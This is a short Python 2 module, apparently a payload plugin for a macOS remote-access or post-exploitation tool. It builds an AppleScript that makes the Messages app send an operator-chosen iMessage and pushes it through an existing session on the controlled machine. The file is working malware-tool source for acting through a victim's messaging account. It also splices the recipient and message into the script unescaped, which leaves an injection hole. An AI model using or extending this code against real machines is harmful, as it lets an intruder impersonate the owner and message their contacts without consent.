class payload:
    def __init__(self):
        self.name = "imessage"
        self.description = "send message through the messages app"
        self.type = "applescript"
        self.id = 116

    def run(self,session,server,command):
        #do something with session if you want
        #we can prompt for input
        phone = raw_input("[*] Enter iMessage recipient: ")
        message = raw_input("[*] Enter message: ")
        #send applescript payload
        payload = """tell application "Messages"
        set targetService to 1st service whose service type = iMessage
        set targetBuddy to buddy \""""+phone+"""\" of targetService
        send \""""+message+"""\" to targetBuddy
        end tell"""
        result = server.sendCommand(self.name,payload,self.type,session.conn)
        if result:
            print result
        return ""
